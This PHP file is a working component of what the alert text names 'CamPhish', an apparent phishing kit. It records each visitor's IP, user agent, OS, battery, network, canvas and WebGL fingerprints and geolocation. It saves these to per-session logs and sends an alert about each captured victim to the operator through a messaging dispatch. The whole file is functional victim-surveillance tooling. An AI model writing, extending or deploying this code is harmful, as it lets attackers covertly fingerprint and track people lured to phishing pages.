<?php
// device_info.php — captures browser/hardware fingerprint
require_once __DIR__ . '/alerts.php';
require_once __DIR__ . '/helpers.php';

$cfg  = include __DIR__ . '/config.php';
$date = date('dMYHis');
$uuid = ($cfg['session_tracking'] ?? true) ? get_visitor_uuid() : 'unknown';

$fields = [
    'os'          => 'OS',
    'browser'     => 'Browser',
    'language'    => 'Language',
    'timezone'    => 'Timezone',
    'screen_w'    => 'Screen Width',
    'screen_h'    => 'Screen Height',
    'pixel_ratio' => 'Pixel Ratio',
    'orientation' => 'Orientation',
    'battery'     => 'Battery Level',
    'network'     => 'Network Type',
    'platform'    => 'Platform',
    'cores'       => 'CPU Cores',
    'memory'      => 'Device Memory (GB)',
    'touch'       => 'Touch Points',
    'wifi_ssid'   => 'Network Connection Info',
    'color_depth' => 'Color Depth',
    'plugins'     => 'Browser Plugins',
    'canvas_hash' => 'Canvas Fingerprint',
    'webgl_vendor'=> 'WebGL Vendor',
    'ip_geo'      => 'IP Geolocation (fallback)',
];

$data  = "=== Device Fingerprint ===\r\n";
$data .= "Date: " . date('d-M-Y H:i:s') . "\r\n";
$data .= "IP: " . (trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown')[0])) . "\r\n";
$data .= "User-Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "\r\n";
$data .= "UUID: $uuid\r\n";
$data .= str_repeat('-', 40) . "\r\n";

$alert_data = ['uuid' => $uuid];
foreach ($fields as $key => $label) {
    $val = isset($_POST[$key]) ? htmlspecialchars(strip_tags($_POST[$key])) : 'Not available';
    $data .= "$label: $val\r\n";
    $alert_data[$key] = $val;
}
$data .= str_repeat('=', 40) . "\r\n\r\n";

// ── Save ──────────────────────────────────────────────────────────
$log_dir = __DIR__ . '/logs/device';
if (!is_dir($log_dir)) mkdir($log_dir, 0755, true);

file_put_contents($log_dir . '/device_' . $date . '.txt', $data);
file_put_contents($log_dir . '/saved_device_info.txt', $data, FILE_APPEND);
file_put_contents($log_dir . '/DeviceInfo.log', "Device info captured\n", FILE_APPEND);

// Session timeline
if ($uuid !== 'unknown') {
    $uuid_dir = __DIR__ . '/logs/sessions/' . $uuid;
    if (!is_dir($uuid_dir)) mkdir($uuid_dir, 0755, true);
    file_put_contents($uuid_dir . '/timeline.log', "[" . date('d-M-Y H:i:s') . "] DEVICE | " . ($alert_data['os'] ?? '?') . " / " . ($alert_data['browser'] ?? '?') . "\n", FILE_APPEND);
    file_put_contents($uuid_dir . '/device.txt', $data);
}

// ── Alert ─────────────────────────────────────────────────────────
$os_val  = $alert_data['os']      ?? 'Unknown';
$br_val  = $alert_data['browser'] ?? 'Unknown';
$bat_val = $alert_data['battery'] ?? 'Unknown';
$net_val = $alert_data['network'] ?? 'Unknown';
$ip_val  = trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown')[0]);

$msg = "📱 <b>CamPhish — Device Fingerprint!</b>\n💻 OS: <code>{$os_val}</code>\n🌐 Browser: <code>{$br_val}</code>\n🔋 Battery: <code>{$bat_val}</code>\n📶 Network: <code>{$net_val}</code>\n📡 IP: <code>{$ip_val}</code>\n🆔 UUID: <code>{$uuid}</code>";
dispatch_alert('device', $msg, $alert_data);

header('Content-Type: application/json');
echo json_encode(['status' => 'ok']);
exit();
